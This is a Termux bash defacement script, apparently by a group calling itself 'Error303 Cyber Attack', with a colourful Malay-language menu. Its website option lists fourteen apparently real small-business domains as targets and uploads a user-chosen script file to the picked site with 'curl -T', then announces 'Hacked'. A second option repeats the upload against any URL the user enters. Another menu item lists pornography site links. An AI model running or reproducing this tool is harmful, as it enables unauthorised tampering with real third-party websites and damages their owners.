#!/usr/bash/sh

#warna

Black='\033[0;30m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
purple='\e[0;35m'
brown='\e[0;33m'
lightgray='\e[0;37m'
darkgray='\e[1;30m'
lightblue='\e[1;34m'
lightgreen='\e[1;32m'
lightcyan='\e[1;36m'
lightred='\e[1;31m'
lightpurple='\e[1;35m'
yellow='\e[1;33m'
white='\e[1;37m'

pkg update && pkg upgrade

echo -e $green " Loading.."
sleep 3.2
echo -e $purple " Harap sabar.."
sleep 4.4
clear
echo -e $cyan
toilet -f future "      Jejak       "
toilet -f future "      Hacker      "
echo -e $blue
sleep 2
echo "#####################################################"
echo -e $green "                      Welcome                      "
echo
echo -e $red "    | [!] $yellow Assalamualaikum wr.wib     "
echo -e $red "    | [*] $yellow Created     : Error303     "
echo -e $red "    | [*] $yellow Teks/pesan  : Nothing Is Imposible "
echo -e $red "    | [!] $yellow Daripada    : Error303 Cyber Attack"
echo
echo -e $green "                    Selamat mencuba               "
echo -e $blue"######################################################"
echo
echo -e $red "  {$white A$red }$white Link Website"
echo -e $red "  {$white B$red }$white Link Bahaya"
echo -e $red "  {$white C$red }$white Deface Website"
echo -e $blue"______________________________________________________"
echo
echo -e $red "  {$white I$red }$white info"
echo -e $red "               {$white Q$red }$white Quit"
echo -e $red "                           {$white E$red }$white Error"
echo -e $blue"______________________________________________________"
sleep 1
echo
echo -e $cyan "╭─$yellow Error303 ~/Cyber$cyan"
read -p "╰─$ " pilihan
echo
if [ $pilihan = "A" ] || [ $pilihan = "a" ]
then
echo
echo
clear
echo
echo
toilet -f future "      Website      " | lolcat
echo
echo -e $red "Simpan Sc Di Memori Luar"
echo
echo -e $blue "
http://contsol.co.za
http://colourfactory.co.za
http://chillibitez.co.za
http://chasingfantasia.com
http://centraltech.co.za
http://cblandscapes.co.za
http://crimsonmonkeyweb.com
http://kevinbutho.com
http://prorepafrica.com
http://xposurephotography.co.za
http://windmillsandporcupines.co.za
http://tcnig.co.za
http://techdirect.co.za
http://thehellenic.co.za "
echo
echo -e $red "Pilih target"
echo -e $cyan "╭─$yellow Error303 ~/Cyber$cyan"
read -p "╰─$ " target
echo
echo -e $red "Masukkan Script!!!"
echo -e $cyan "╭─$yellow Error303 ~/Cyber$cyan"
read -p "╰─$ " script
curl -T /storage/emulated/0/$script $target
echo -e $red "[$yellow Hacked$red ]$target"
echo
echo -e $red "[$white B $red]$white back $red[$white Q $red]$white Quit"
read -p "[B/Q] : " back
fi


if [ $pilihan = "B" ] || [ $pilihan = "b" ]
then
echo
sleep 1
clear
echo
figlet "      SEX      " | lolcat
echo
echo -e $red " Saya dah kata jangan dibuka "
echo
echo -e $cyan "
https://xhamster.com
https://pornhub.com
https://pornstar.com
https://xvideo.com
https://shoplifter.com
https://brazzer.com "
echo
echo -e $red "Tinggal Copy Dan Paste Di Google/Browser "
echo
echo -e $red " Pliss Tobat Bro Haha "
echo
echo -e $red "[$white B $red]$white back $red[$white Q $red]$white Quit"
echo
read -p "[B/Q] : " back
fi


if [ $pilihan = "C" ] || [ $pilihan = "c" ]
then
echo
sleep 1
clear
echo
toilet -f future "  Deface Website  " | lolcat
echo
echo -e $purple " Tekan ctrl-c untuk cancel "
echo
echo -e $red "Sila guna dengan bijak"
echo
echo -e $cyan "Masukkan Scipt!!"
echo -e $cyan "╭─$yellow Error303 ~/Cyber$cyan"
read -p "╰─$ " script
echo
echo -e $red "Masukkan Target!!"
echo -e $cyan "╭─$yellow Error303 ~/Cyber$cyan"
read -p "╰─$ " target
curl -T /storage/emulated/0/$script $target
echo -e $red "[$yellow Hacked $red]$target"
echo
fi

if [ $pilihan = "I" ] || [ $pilihan = "i" ]
then
sleep 1
clear
echo
echo
toilet -f future "     Info Tools     " | lolcat
echo
echo -e $cyan"______________________________________________________"
echo
echo -e $red "[*]$yellow Assalamualaikum wr.wib"
echo -e $red "[*]$yellow Created        : Error303"
echo -e $red "[*]$yellow Teks/pesan     : Nothing Is Impossible"
echo -e $red "[*]$yellow Daripada       : Error Cyber Attacks "
echo -e $red "[*]$yellow MyGithub       : https://github.com/amirul06 "
echo -e $red "[*]$yellow My IG          : @Era_Beku    "
echo
echo -e $purple "                       Thanks To :          "
echo
echo -e $blue "[+]$red Error303 Cyber Attacks "
echo -e $blue "[+]$red NotNot404 Cyber Girls "
echo
echo -e $cyan"_____________________________________________________"
echo
echo -e $red "[$white B $red]$white back $red [$white Q $red]$white Quit "
read -p "[B/Q] : " back
echo
fi

if [ $pilihan = "Q" ] || [ $pilihan = "q" ]
then
echo
clear
exit
fi

if [ $pilihan = "E" ] || [ $pilihan = "e" ]
then
clear
pkg install cmatrix
cmatrix
fi
